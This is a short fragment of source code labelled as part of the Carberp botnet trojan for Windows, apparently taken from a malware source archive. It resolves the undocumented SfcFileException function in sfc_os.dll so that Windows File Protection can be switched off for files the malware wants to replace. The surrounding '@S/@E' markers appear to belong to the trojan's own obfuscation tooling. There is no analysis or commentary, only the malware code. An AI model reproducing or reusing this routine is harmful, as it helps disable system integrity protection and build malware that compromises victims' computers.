/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */

//@S
HANDLE _SFC_OS=0;

DWORD (WINAPI *_SfcFileException)(HANDLE rpc,LPCWSTR fname,DWORD type);
//@E

void InitSFC_OS()
{
 _SFC_OS = _GetModuleHandle("sfc_os.dll");
 if (/*@S==*/_SFC_OS == NULL/*@E*/) _SFC_OS = _LoadLibrary("sfc_os.dll");
 if (/*@S==*/_SFC_OS == NULL/*@E*/) return; // no sfc_os.dll

 _SfcFileException = (DWORD *)_GetProcAddress(_SFC_OS,(LPCSTR)5);
}
